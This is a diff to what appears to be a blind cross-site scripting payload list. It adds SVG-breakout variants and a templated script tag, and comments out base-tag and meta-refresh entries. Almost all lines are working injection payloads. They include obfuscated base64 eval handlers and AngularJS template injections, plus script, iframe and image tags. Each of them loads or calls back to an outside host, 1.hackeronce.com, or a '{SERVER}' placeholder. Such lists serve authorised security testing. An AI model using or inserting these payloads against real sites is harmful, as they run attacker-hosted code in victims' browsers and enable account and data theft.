@@ -44,6 +44,9 @@ document.head.appendChild(Object.assign(document.createElement('script'),{src:'/
 Image tag
 '"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">
 
+Image tag with SVG breakout
+'"> </svg></svg><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">
+
 Input tag with autofocus
 '"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">
 
@@ -56,23 +59,27 @@ javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4Ln
 Render an iframe to validate your injection point and receive a callback
 '"><iframe src="https://1.hackeronce.com"></iframe>
 
-Bypass certain Content Security Policy (CSP) restrictions with a base tag
-<base href="https://1.hackeronce.com" />
+Bypass certain Content Security Policy (CSP) restrictions with a base tag (commented out to prevent interference)
+<!-- <base href="https://1.hackeronce.com" /> -->
 
-Make use of the meta-tag to initiate a redirect
-<meta http-equiv="refresh" content="0; url=https://1.hackeronce.com" />
+Make use of the meta-tag to initiate a redirect (commented out to prevent interference)
+<!-- <meta http-equiv="refresh" content="0; url=https://1.hackeronce.com" /> -->
 
 In case your target makes use of AngularJS
 {{constructor.constructor("import('https://1.hackeronce.com/shopscript')")()}}
 
 Script tag
 '"><script src="https://1.hackeronce.com"></script>
+'"><script src="{SERVER}/script.js"></script>
 
 Injecting an external script (bypass)
 '"><svg onload="eval(atob(this.id))" id="aW1wb3J0KCcvLzEuaGFja2Vyb25jZS5jb20vcXVhbHRyaWNzJyk=">
 
 HTTP callback
 '"><img src="https://1.hackeronce.com/shopimg.png">
+
+HTTP callback with SVG breakout
+'"></svg><img src="https://1.hackeronce.com/shopimg.png">
 
 onerror with base64 eval
 "onerror="eval(atob('Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0nMS5oYWNrZXJvbmNlLmNvbSc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh4KTs='))"x="
@@ -86,11 +93,11 @@ jQuery getScript with comments
 JavaScript protocol with base64 eval
 javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0nMS5oYWNrZXJvbmNlLmNvbSc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh4KTs="))
 
-Base tag variation
-"><base/href="//1.hackeronce.com">
+Base tag variation (commented out to prevent interference)
+<!-- "><base/href="//1.hackeronce.com"> -->
 
-Meta refresh variation
-"><meta/http-equiv="refresh"/content="0;url=https://1.hackeronce.com">
+Meta refresh variation (commented out to prevent interference)
+<!-- "><meta/http-equiv="refresh"/content="0;url=https://1.hackeronce.com"> -->
 
 AngularJS variation
 {{constructor.constructor("import('https://1.hackeronce.com/shopscript')")()}}
@@ -128,11 +135,11 @@ AngularJS with ?p=angular
 Iframe with /ab path
 '"><iframe src="https://1.hackeronce.com/ab"></iframe>
 
-Base tag with /ac path
-<base href="https://1.hackeronce.com/ac" />
+Base tag with /ac path (commented out to prevent interference)
+<!-- <base href="https://1.hackeronce.com/ac" /> -->
 
-Meta refresh with /aa path
-<meta http-equiv="refresh" content="0; url=https://1.hackeronce.com/aa" />
+Meta refresh with /aa path (commented out to prevent interference)
+<!-- <meta http-equiv="refresh" content="0; url=https://1.hackeronce.com/aa" /> -->
 
 AngularJS with shopscript
 {{constructor.constructor("import('https://1.hackeronce.com/shopscript')")()}}
